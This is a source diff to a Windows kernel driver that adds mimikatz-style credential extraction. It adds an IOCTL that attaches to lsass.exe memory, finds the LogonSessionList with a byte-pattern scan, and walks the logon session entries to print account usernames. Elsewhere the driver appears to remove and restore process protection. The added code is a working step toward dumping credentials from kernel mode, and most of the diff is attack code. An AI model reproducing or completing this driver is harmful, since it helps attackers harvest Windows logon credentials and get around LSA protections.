@@ -1,7 +1,4 @@
-#include <ntifs.h>
-#include <ntddk.h>
-#include <wdm.h>
-#include <stdarg.h>
+#include "mimikatz.h"
 //////////////////////////////////////////////////////////////////////////////////
 //We need to start by getting undocumented functions 
 //:57
@@ -94,6 +91,9 @@ namespace driver {
 
 		constexpr ULONG lssl = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x702, METHOD_BUFFERED, FILE_SPECIAL_ACCESS); //write process mem.
 
+		constexpr ULONG extract = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x703, METHOD_BUFFERED, FILE_SPECIAL_ACCESS); //write process mem.
+
+
 	}
 
 	struct Request {
@@ -122,7 +122,7 @@ namespace driver {
 	}
 
 
-    #define CHUNK_SIZE 4096
+#define CHUNK_SIZE 4096
 
 	// Compare 12 bytes at base with pattern
 	bool compare12(UCHAR* base, UCHAR pattern[12]) {
@@ -135,15 +135,15 @@ namespace driver {
 
 	// Scan memory from pBase to pEnd in chunks for the pattern
 	PVOID patternScanner(PVOID pBase, PVOID pEnd) {
-		UCHAR pattern[12] = {0x33,0xFF,0x41,0x89,0x37,0x4C,0x8B,0xF3,0x45,0x85,0xC0,0x74};
+		UCHAR pattern[12] = { 0x33,0xFF,0x41,0x89,0x37,0x4C,0x8B,0xF3,0x45,0x85,0xC0,0x74 };
 		const size_t patternLength = sizeof(pattern);
 
 		UCHAR* start = (UCHAR*)pBase;
 		UCHAR* end = (UCHAR*)pEnd;
 
-		for (UCHAR* chunkStart = start; chunkStart + patternLength <= end; chunkStart += (CHUNK_SIZE - (patternLength - 1))){
+		for (UCHAR* chunkStart = start; chunkStart + patternLength <= end; chunkStart += (CHUNK_SIZE - (patternLength - 1))) {
 			size_t remaining = end - chunkStart;
-			
+
 			size_t scanSize;
 
 			if (remaining < CHUNK_SIZE)
@@ -158,7 +158,7 @@ namespace driver {
 				for (size_t j = 0; j <= scanSize - 12; j++) {
 					if (compare12(chunkStart + j, pattern)) {
 						debug_printer("FOUND IT! Setting offset....\n");
-						
+
 						ULONG_PTR address = (ULONG_PTR)(chunkStart + j);
 						ULONG offset = (ULONG)(((UCHAR*)chunkStart + j) - (UCHAR*)pBase);
 						DbgPrint("Win1803 Location: 0x%p\n", (PVOID)address);
@@ -178,6 +178,42 @@ namespace driver {
 		}
 
 		return (PVOID)0; // pattern not found
+	}
+
+	void extract(PEPROCESS target_process, PVOID pLogonSessionList) {
+		if (target_process != nullptr) {
+			debug_printer("Attached to target process.\n");
+			_try
+			{
+				// Resolve the head pointer after attaching to ensure it's valid
+				PKIWI_MSV1_0_LIST_63 headLogonSessionList = *(PKIWI_MSV1_0_LIST_63*)pLogonSessionList;
+
+				if (!headLogonSessionList || !MmIsAddressValid(headLogonSessionList)) {
+					DbgPrint("Head pointer invalid! [1]\n");
+					_leave;  // safely exit _try/_finally
+				}
+				PKIWI_MSV1_0_LIST_63 current = headLogonSessionList->Flink;
+				while (current != headLogonSessionList) {
+					// Validate the current node and its username buffer
+					if (MmIsAddressValid(current) && MmIsAddressValid(current->UserName.Buffer)) {
+						DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "%ws\n", current->UserName.Buffer);
+					}
+					else {
+						 DbgPrint("Skipping invalid session node. [2]\n");
+					}
+					// Advance to the next node safely
+					if (!MmIsAddressValid(current->Flink)) {
+						DbgPrint("Next node pointer invalid, stopping iteration. [3]\n");
+						break;
+					}
+					current = current->Flink;
+				}
+			}
+				_except(EXCEPTION_EXECUTE_HANDLER)
+			{
+				DbgPrint("Exception caught while iterating logon sessions.\n");
+			}
+		}
 	}
 
 
@@ -252,19 +288,14 @@ namespace driver {
 		case codes::lssl:
 			//we need to have a target process before we cna read proc mem
 			debug_printer("Entering find lsl...\n");
-			
-			
-			
 			debug_printer("Setting passive...\n");
 			if (KeGetCurrentIrql() != PASSIVE_LEVEL) {
 				request->pattern = 0;
 				status = STATUS_INVALID_DEVICE_STATE;
 				break;
 			}
-
-
 			debug_printer("IRQL level = passive...\n");//IRQL passive means this is just a normal thread, the CPU can interupt it for 
-													   //more important tasks since our byte scanner might take a while...
+			//more important tasks since our byte scanner might take a while...
 
 			if (target_process != nullptr) {
 				//Attach to lsass.exe so that we can better reference mem space
@@ -277,12 +308,16 @@ namespace driver {
 						//now that we're attached all reference in memory go through lsass.exe
 						PVOID pLogonSessionList = patternScanner(request->pBase, request->pEnd);
 						debug_printer("Done searching for pattern...\n");
-
 						if (pLogonSessionList != NULL) {
 							request->pattern = pLogonSessionList;
 							debug_printer("Found lsl offset???!!!! <-----\n...");
 							DbgPrint("Pointer (from try) : 0x%p\n", pLogonSessionList);
-
+							/*if (MmIsAddressValid(pLogonSessionList)) {
+								DbgPrint("Pointer is valid...\n");
+								DbgPrint("Zero Dark 30 - running extraction mission...\n");
+								extract(target_process, pLogonSessionList);
+								DbgPrint("recovered hostages...\n");
+							}*/
 							status = STATUS_SUCCESS;
 						}
 						else {
@@ -294,8 +329,8 @@ namespace driver {
 						request->pattern = NULL;
 					}
 				}
-				_finally{
-					KeUnstackDetachProcess(&apc); // Detach when finished 
+					_finally{
+						KeUnstackDetachProcess(&apc); // Detach when finished 
 				}
 			}
 			break;
@@ -307,11 +342,54 @@ namespace driver {
 				debug_printer("Added protection levels back...\n");
 			}
 			break;
-
 			//We will be accessing fields within the EPROCESS field of a process via offsets.  
 			//PsLookupProcessByProcessId returns a base pointer to the EPROCESS struct of a given process.  Adding onto this
 			//Can help us find the EPROC
+		case codes::extract:
+			debug_printer("Setting passive...\n");
+			// Must be at PASSIVE_LEVEL to access paged memory
+			if (KeGetCurrentIrql() != PASSIVE_LEVEL) {
+				request->pattern = 0;
+				status = STATUS_INVALID_DEVICE_STATE;
+				break;
+			}
+			debug_printer("PASSIVE_LEVEL confirmed.\n");
+			if (target_process != nullptr && psProtection != nullptr) {
+				KAPC_STATE apc;
+				KeStackAttachProcess(target_process, &apc);
+				debug_printer("Attached to target process.\n");
 
+				_try
+				{
+					// Resolve the head pointer after attaching to ensure it's valid
+					PKIWI_MSV1_0_LIST_63 headLogonSessionList = *(PKIWI_MSV1_0_LIST_63*)request->pBase;
+					if (!headLogonSessionList || !MmIsAddressValid(headLogonSessionList)) {
+						DbgPrint("Head pointer invalid!\n");
+						_leave;  // safely exit _try/_finally
+					}
+					PKIWI_MSV1_0_LIST_63 current = headLogonSessionList->Flink;
+					while (current != headLogonSessionList) {
+						// Validate the current node and its username buffer
+						if (MmIsAddressValid(current) && MmIsAddressValid(current->UserName.Buffer)){
+							DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "%ws\n", current->UserName.Buffer);
+						}else{
+							  DbgPrint("Skipping invalid session node.\n");
+						}
+						// Advance to the next node safely
+						if (!MmIsAddressValid(current->Flink)) {
+							DbgPrint("Next node pointer invalid, stopping iteration.\n");
+							break;
+						}
+						current = current->Flink;
+					}
+				} 
+				_except(EXCEPTION_EXECUTE_HANDLER)
+				{
+					DbgPrint("Exception caught while iterating logon sessions.\n");
+				}
+				KeUnstackDetachProcess(&apc);
+			}
+			break;
 		default:
 			break;
 
